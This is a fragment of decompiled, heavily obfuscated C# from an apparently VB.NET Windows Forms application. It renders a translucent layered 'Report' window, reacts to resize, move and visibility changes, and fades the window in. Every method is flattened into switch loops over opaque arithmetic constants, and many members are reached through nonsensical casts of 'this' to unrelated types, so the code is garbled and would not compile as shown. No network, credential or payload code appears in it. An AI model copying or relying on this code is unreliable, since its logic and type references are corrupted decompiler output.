            graphicsPath1.CloseFigure();
            num1 = (int) num2 * 527267115 ^ -709788919;
            continue;
          default:
            goto label_6;
        }
      }
label_6:
      return graphicsPath2;
    }

    protected override CreateParams CreateParams
    {
      get
      {
        CreateParams createParams = base.CreateParams;
label_1:
        int num1 = 820225974;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (-(num1 * -937000637) - 2068516041 * -343487915)) % 4U)
          {
            case 1:
              int num3 = this.DesignMode ? 1814154187 : (num3 = 1852545957);
              num1 = num3 ^ (int) num2 * 1970087606;
              continue;
            case 2:
              createParams.ExStyle |= 524288;
              num1 = (int) num2 * 1472581431 ^ 443508635;
              continue;
            case 3:
              goto label_1;
            default:
              goto label_5;
          }
        }
label_5:
        return createParams;
      }
    }

    public void BitmapClean()
    {
      if (this.IsDisposed)
        return;
label_1:
      int num1 = -1907438722;
      Bitmap bm;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) ~~-~(num1 - 1493351652 * -769019459 * 1236534395)) % 6U)
        {
          case 0:
            int num3 = this.Height <= 0 ? -776846230 : (num3 = -800066934);
            num1 = num3 ^ (int) num2 * 287589456;
            continue;
          case 1:
            goto label_8;
          case 2:
            goto label_1;
          case 3:
            int num4 = this.Width <= 0 ? 1707532456 : (num4 = -1877805455);
            num1 = num4 ^ (int) num2 * 757098710;
            continue;
          case 4:
            this.UpdateWindow(bm);
            num1 = (int) num2 * 399886848 ^ 991590378;
            continue;
          case 5:
            bm = new Bitmap(this.Width, this.Height, PixelFormat.Format32bppPArgb);
            num1 = (int) num2 * 1047163660 ^ -1299291081;
            continue;
          default:
            goto label_9;
        }
      }
label_8:
      return;
label_9:;
    }

    public void UpdateWindow(Bitmap bm)
    {
      if (this.IsDisposed)
        return;
label_1:
      int num1 = 874354810;
      while (true)
      {
        int num2 = num1;
        uint num3;
        switch ((num3 = (uint) (((-(1557288241 - -427131633) - (num2 - (1500549351 * ~(-1362702137 ^ -353830657) - -(-1690438880 - 2068571636 ^ ~-61388463)) * 33906831 - (---1305544386 ^ 1643580879 * -1560595873))) * 1767344575 ^ 1112345763 * 1083930755) * 1386320263)) % 4U)
        {
          case 0:
            goto label_1;
          case 1:
            if (this.Height > 0)
            {
              num1 = (int) num3 * 857195838 ^ 1711164563;
              continue;
            }
            goto label_29;
          case 3:
            if (this.Width > 0)
            {
              num1 = (int) num3 * -361108297 ^ -202778063;
              continue;
            }
            goto label_32;
          default:
            goto label_7;
        }
      }
label_32:
      return;
label_29:
      return;
label_7:
      Bitmap bitmap = new Bitmap(this.Width, this.Height, PixelFormat.Format32bppPArgb);
      try
      {
        Graphics graphics = Graphics.FromImage((Image) bitmap);
        try
        {
          graphics.SmoothingMode = SmoothingMode.AntiAlias;
          graphics.InterpolationMode = InterpolationMode.HighQualityBicubic;
          graphics.PixelOffsetMode = PixelOffsetMode.HighQuality;
label_10:
          int num4 = 1088886998;
          while (true)
          {
            int num5 = num4;
            uint num6;
            IntPtr dc;
            IntPtr compatibleDc;
            NativeMethods.BLENDFUNCTION pblend;
            IntPtr hObj;
            IntPtr hbitmap;
            switch ((num6 = (uint) (((-(1557288241 - -427131633) - (num5 - (1500549351 * ~(-1362702137 ^ -353830657) - -(-1690438880 - 2068571636 ^ ~-61388463)) * 33906831 - (---1305544386 ^ 1643580879 * -1560595873))) * 1767344575 ^ 1112345763 * 1083930755) * 1386320263)) % 14U)
            {
              case 0:
                NativeMethods.DeleteDC(dc);
                num4 = (int) num6 * 748569350 ^ -846551660;
                continue;
              case 1:
                int num7 = bm == null ? -1544306514 : (num7 = -1426717349);
                num4 = num7 ^ (int) num6 * -659215130;
                continue;
              case 2:
                NativeMethods.SelectObject(compatibleDc, hObj);
                NativeMethods.DeleteObject(hbitmap);
                num4 = (int) num6 * 201224302 ^ 250340256;
                continue;
              case 3:
                graphics.CompositingQuality = CompositingQuality.GammaCorrected;
                num4 = (int) num6 * 2046937025 ^ 1183800612;
                continue;
              case 4:
                pblend = (NativeMethods.BLENDFUNCTION) new NativeMethods((byte) 225);
                num4 = (int) num6 * -1011089377 ^ 1668871483;
                continue;
              case 5:
                goto label_25;
              case 6:
                graphics.DrawImage((Image) bm, new Rectangle(0, 0, bm.Width, bm.Height));
                num4 = (int) num6 * -524706596 ^ -344391348;
                continue;
              case 7:
                goto label_10;
              case 8:
                Point location = this.Location;
                Size size = bitmap.Size;
                Point empty = Point.Empty;
                // ISSUE: reference to a compiler-generated method
                Report.VB\u0024StateMachine_25_Report_MouseClick.UpdateLayeredWindow(((reso) this).MeHand, dc, ref location, ref size, compatibleDc, ref empty, 0, ref pblend, 2);
                num4 = (int) num6 * 1939217779 ^ -821594519;
                continue;
              case 9:
                hObj = NativeMethods.SelectObject(compatibleDc, hbitmap);
                num4 = (int) num6 * 1355011427 ^ -2084100396;
                continue;
              case 10:
                hbitmap = bitmap.GetHbitmap(Color.FromArgb(0));
                num4 = (int) num6 * -634056513 ^ -1278916918;
                continue;
              case 11:
                dc = NativeMethods.GetDC(IntPtr.Zero);
                compatibleDc = NativeMethods.CreateCompatibleDC(dc);
                num4 = -797953475;
                continue;
              case 12:
                graphics.CompositingMode = CompositingMode.SourceOver;
                num4 = (int) num6 * 2012650160 ^ -1114346550;
                continue;
              case 13:
                NativeMethods.DeleteDC(compatibleDc);
                num4 = (int) num6 * -1925946650 ^ -567550683;
                continue;
              default:
                goto label_12;
            }
          }
label_25:
          return;
label_12:;
        }
        finally
        {
          if (graphics != null)
          {
label_27:
            int num8 = -172904624;
            while (true)
            {
              int num9 = num8;
              uint num10;
              switch ((num10 = (uint) (((-(1557288241 - -427131633) - (num9 - (1500549351 * ~(-1362702137 ^ -353830657) - -(-1690438880 - 2068571636 ^ ~-61388463)) * 33906831 - (---1305544386 ^ 1643580879 * -1560595873))) * 1767344575 ^ 1112345763 * 1083930755) * 1386320263)) % 3U)
              {
                case 0:
                  goto label_27;
                case 1:
                  graphics.Dispose();
                  num8 = (int) num10 * -55704720 ^ -356771437;
                  continue;
                default:
                  goto label_31;
              }
            }
          }
label_31:;
        }
      }
      finally
      {
        if (bitmap != null)
        {
label_34:
          int num11 = -994110267;
          while (true)
          {
            int num12 = num11;
            uint num13;
            switch ((num13 = (uint) (((-(1557288241 - -427131633) - (num12 - (1500549351 * ~(-1362702137 ^ -353830657) - -(-1690438880 - 2068571636 ^ ~-61388463)) * 33906831 - (---1305544386 ^ 1643580879 * -1560595873))) * 1767344575 ^ 1112345763 * 1083930755) * 1386320263)) % 3U)
            {
              case 1:
                bitmap.Dispose();
                num11 = (int) num13 * -1572766528 ^ -1737861745;
                continue;
              case 2:
                goto label_34;
              default:
                goto label_38;
            }
          }
        }
label_38:;
      }
    }

    protected override void OnResize(EventArgs e)
    {
      base.OnResize(e);
label_1:
      int num1 = 1416100649;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (((-num1 - (-((763479115 - -1259689299) * 325386655) ^ 2054156276)) * 1451132347 - -806627361 ^ 365139973 + 691333882) * 1445569167)) % 4U)
        {
          case 0:
            this.UpdateWindow((Bitmap) null);
            num1 = (int) num2 * -109950830 ^ 1229335046;
            continue;
          case 1:
            int num3 = !this.Created ? -1931173936 : (num3 = 739835422);
            num1 = num3 ^ (int) num2 * 1035563806;
            continue;
          case 2:
            goto label_3;
          case 3:
            goto label_1;
          default:
            goto label_6;
        }
      }
label_3:
      return;
label_6:;
    }

    protected override void OnLocationChanged(EventArgs e)
    {
      base.OnLocationChanged(e);
      if (!this.Created)
        return;
label_1:
      int num1 = 2071967373;
      while (true)
      {
        int num2 = num1;
        uint num3;
        switch ((num3 = (uint) (~(1652502067 - 1547087821) - -(num2 + ((~(1433083263 ^ 232014104) ^ -(764243559 - -971231300)) + -753335945 * (-1645468285 * (627325719 * -1940523680 + -1065567107 * -2043406520)))) * -1326654157)) % 3U)
        {
          case 0:
            goto label_1;
          case 1:
            this.UpdateWindow((Bitmap) null);
            num1 = (int) num3 * 1532180712 ^ -448379931;
            continue;
          case 2:
            goto label_5;
          default:
            goto label_6;
        }
      }
label_5:
      return;
label_6:;
    }

    protected override void OnVisibleChanged(EventArgs e)
    {
      base.OnVisibleChanged(e);
label_1:
      int num1 = -1548176892;
      while (true)
      {
        int num2 = num1;
        uint num3;
        switch ((num3 = (uint) (-(~(-(--1369450394 - 680938538 * -94844139 - 764377236 - (-754047656 - 481870755 + (-248130600 - 1868303073)) * -1462086549) - num2) * 292365561 - 217957653 * -1036257578) * 1742153707)) % 4U)
        {
          case 0:
            this.UpdateWindow((Bitmap) null);
            num1 = (int) num3 * 1547875609 ^ -995900318;
            continue;
          case 1:
            int num4 = !this.Visible ? 1917926937 : (num4 = -1358485028);
            num1 = num4 ^ (int) num3 * 911014199;
            continue;
          case 2:
            goto label_1;
          case 3:
            goto label_3;
          default:
            goto label_6;
        }
      }
label_3:
      return;
label_6:;
    }

    private void Report_Closing(object sender, CancelEventArgs e)
    {
      if (this.Bgworker == null)
        return;
label_1:
      int num1 = -1253048779;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (-(num1 * -2134918041 * 2075815723) * -591122775 * 657730733)) % 3U)
        {
          case 0:
            goto label_1;
          case 1:
            this.Bgworker.Dispose();
            num1 = (int) num2 * -1856855277 ^ -850298689;
            continue;
          case 2:
            goto label_5;
          default:
            goto label_6;
        }
      }
label_5:
      return;
label_6:;
    }

    [CompilerGenerated]
    internal void MoveNext()
    {
      int state = ((reso) this).\u0024State;
      int num;
      try
      {
        TaskAwaiter taskAwaiter;
        if (state == 0)
        {
          num = -1;
          ((reso) this).\u0024State = -1;
          taskAwaiter = ((RefreshExplorer.HChangeNotifyFlags) this).\u0024A0;
          ((RefreshExplorer.HChangeNotifyFlags) this).\u0024A0 = new TaskAwaiter();
          goto label_5;
        }
label_3:
        if (((CustomFont) this).\u0024VB\u0024Local_o.Opacity < 1.0)
        {
          taskAwaiter = Task.Delay(((CustomFontDrawString) this).\u0024VB\u0024Local_interval).GetAwaiter();
          if (!taskAwaiter.IsCompleted)
          {
            num = 0;
            ((reso) this).\u0024State = 0;
            ((RefreshExplorer.HChangeNotifyFlags) this).\u0024A0 = taskAwaiter;
            ref AsyncVoidMethodBuilder local1 = ref ((reso) this).\u0024Builder;
            ref TaskAwaiter local2 = ref taskAwaiter;
            // ISSUE: variable of a compiler-generated type
            Report.VB\u0024StateMachine_17_FadeIn stateMachine17FadeIn = (Report.VB\u0024StateMachine_17_FadeIn) this;
            ref Report.VB\u0024StateMachine_17_FadeIn local3 = ref stateMachine17FadeIn;
            local1.AwaitUnsafeOnCompleted<TaskAwaiter, Report.VB\u0024StateMachine_17_FadeIn>(ref local2, ref local3);
            return;
          }
        }
        else
        {
          ((CustomFont) this).\u0024VB\u0024Local_o.Opacity = 1.0;
          goto label_9;
        }
label_5:
        taskAwaiter.GetResult();
        taskAwaiter = new TaskAwaiter();
        (((RefreshExplorer.HChangeNotifyFlags) this).\u0024S0 = ((CustomFont) this).\u0024VB\u0024Local_o).Opacity = ((RefreshExplorer.HChangeNotifyFlags) this).\u0024S0.Opacity + 0.05;
        goto label_3;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        Exception exception = ex;
        ((reso) this).\u0024State = -2;
        ((reso) this).\u0024Builder.SetException(exception);
        ProjectData.ClearProjectError();
        return;
      }
label_9:
      num = -2;
      ((reso) this).\u0024State = -2;
      ((reso) this).\u0024Builder.SetResult();
    }
  }
}
